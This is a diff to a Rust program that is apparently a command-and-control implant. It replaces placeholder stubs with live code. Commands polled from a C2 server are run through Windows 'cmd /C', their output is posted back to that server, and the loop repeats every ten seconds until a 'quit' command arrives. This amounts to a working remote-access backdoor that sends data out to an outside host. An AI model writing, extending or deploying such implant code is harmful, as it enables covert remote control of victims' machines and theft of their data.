@@ -1,7 +1,8 @@
 use reqwest::Result;
 use reqwest::blocking::Client;
-//use std::process::Command;
+use std::process::Command;
 use std::time::Duration;
+use std::{thread, time};
 
 fn poll_command(client: &Client, url: &str) -> Result<String> {
     // Poll the C2 server to see if we have any waiting commands
@@ -10,13 +11,23 @@ fn poll_command(client: &Client, url: &str) -> Result<String> {
     Ok(res)
 }
 
-fn run_command(cmd: &str) -> &str {
-    println!("Dummy running command: {}", cmd);
-    "wibble"
+fn run_command(cmd: &str) -> String {
+    match Command::new("cmd")
+            .args(&["/C", cmd])
+            .output() {
+        Ok(output) => {
+            let stdout = String::from_utf8(output.stdout).unwrap();
+            return stdout
+        }
+        Err(e) => {
+            return format!("Error: {}", e)
+        }
+    }
 }
 
-fn post_result(res: &str) {
-    println!("Dummy post of result: {}", res);
+fn post_result(client: &Client, url: &str, output: String) -> Result<()> {
+    client.post(url).body(output).send()?;
+    Ok(())
 }
 
 fn main() -> Result<()>{
@@ -28,15 +39,23 @@ fn main() -> Result<()>{
     loop {
         // Check for commands
         match poll_command(&client, url) {
-            Ok(cmd) => {
-                let res = run_command(&cmd);
-                post_result(res)
+            Ok(cmd) if cmd != "quit" && cmd != "" => {
+                let output = run_command(&cmd);
+                post_result(&client, url, output)?;
+                continue
+            },
+            Ok(cmd) if cmd == "quit" => {
+                post_result(&client, url, "quitting".to_string())?;
+                break
             },
             Err(_) => {
-                println!("There has been an error");
-                break
+                println!("There has been an error")
+            },
+            Ok(_) => {
+                
             }
         }
+        thread::sleep(time::Duration::from_secs(10));
     }
 
     Ok(())
